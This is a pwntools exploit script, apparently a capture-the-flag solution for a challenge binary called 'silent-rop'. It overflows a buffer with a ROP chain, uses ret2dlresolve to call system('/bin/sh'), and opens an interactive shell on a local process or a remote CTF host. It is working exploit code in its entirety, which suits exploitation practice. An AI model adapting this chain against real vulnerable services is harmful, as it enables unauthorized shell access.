#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./silent-rop')
rop = ROP(binary)
dl = Ret2dlresolvePayload(binary, symbol='system', args=['/bin/sh'])

rop.read(0,dl.data_addr,len(dl.payload))
rop.ret2dlresolve(dl)

if args.REMOTE:
	p = remote('ctf.k3rn3l4rmy.com', 2202)
else:
	p = process(binary.path)

payload  = b''
payload += 0x1c * b'A'
payload += rop.chain()
payload += (0xd8 - len(payload)) * b'\0'
payload += dl.payload

p.send(payload)
p.interactive()
